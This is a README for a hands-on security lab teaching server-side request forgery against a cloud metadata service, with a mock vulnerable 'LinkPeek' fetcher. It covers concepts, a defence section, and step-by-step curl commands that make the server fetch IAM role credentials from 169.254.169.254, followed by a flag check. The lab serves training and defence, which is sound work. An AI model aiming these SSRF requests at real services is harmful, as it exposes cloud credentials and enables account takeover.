# ssrf-cloud-metadata

## Concepts

**Server-Side Request Forgery (SSRF)** is when an application takes a URL (or host) from the user and
makes a **server-side** request to it. If there's no allow-list, the attacker can make the server
reach addresses *they* can't — internal services, admin panels, and above all the **cloud instance
metadata service**.

- **Why it matters.** In the cloud, every instance can reach a magic link-local address —
  **`169.254.169.254`** (the IMDS) — that returns the instance's configuration *and its IAM role
  credentials*. An SSRF that reaches it hands the attacker **temporary AWS keys**, and from there the
  permissions of the whole instance role. SSRF is its own category in the OWASP Top 10, and metadata
  theft is the classic high-impact case (it was the core of the 2019 Capital One breach).
- **How it works.** A feature like "preview this link" or "import from URL" fetches the URL on the
  server. Point it at the metadata service:
  ```
  http://169.254.169.254/latest/meta-data/iam/security-credentials/          -> the role name
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>    -> JSON IAM credentials
  ```
  The server fetches it and returns the body to you — `AccessKeyId`, `SecretAccessKey`, `Token`.
- **The fix.** Validate the target at the boundary: an **allow-list** of permitted hosts; **block
  internal / link-local / private** ranges (including `169.254.169.254`); don't return raw fetch
  bodies to the client; and on AWS, require **IMDSv2** (which a simple SSRF can't satisfy).

This lab's `/fetch` endpoint has no allow-list, and a mock metadata service is reachable only from
inside the box at `169.254.169.254`.

## Tasks

Start the lab with `./lab up ssrf-cloud-metadata`, then open a shell:
`./lab shell ssrf-cloud-metadata`. LinkPeek runs at `http://127.0.0.1:8080` — drive it with `curl`.

1. **Recon** — see what the fetcher does, and that the metadata service is internal-only:
   ```
   curl -s 'http://127.0.0.1:8080/fetch?url=http://example.com'         # fetches an external page
   curl -s http://169.254.169.254/latest/meta-data/ 2>&1 | head         # internal service
   ```
2. **Exploit** — make the *server* fetch the metadata credentials for you:
   ```
   curl -s -G http://127.0.0.1:8080/fetch \
     --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
   # take the role name it returns, then:
   curl -s -G http://127.0.0.1:8080/fetch \
     --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'
   ```
   The response is the instance's IAM credentials — exfiltrated through the server.
3. **Capture the flag** — reaching the credentials makes the server write it; confirm:
   ```
   cat /flag/solved
   ```
4. **Record your findings** in `/root/answers.txt` (`METADATA_IP`, `STOLEN`, `DEFENSE`).

Check your work from the host: `./lab check ssrf-cloud-metadata`.

<details>
<summary>Hints</summary>

- The metadata IP is the same on every cloud instance: `169.254.169.254`.
- `curl -G --data-urlencode 'url=...'` keeps your inner URL intact as one parameter.
- First list the role at `.../security-credentials/`, then request `.../security-credentials/<role>`
  for the JSON keys.
- For the fix: allow-list the hosts the fetcher may reach, block link-local/metadata/private
  addresses, or require IMDSv2.

</details>

## My notes

<!-- Screenshots: ./lab shot ssrf-cloud-metadata ~/Screenshots/<file>.png <name>, then link it as
     ![what it shows](screenshots/<name>.png). Prefer code blocks for terminal output. -->

## Related

- `command-injection`, `insecure-file-upload` — other server-side paths to compromise on this layer.
- `waf-modsecurity-crs` — the kind of control that would try to catch an outbound SSRF.
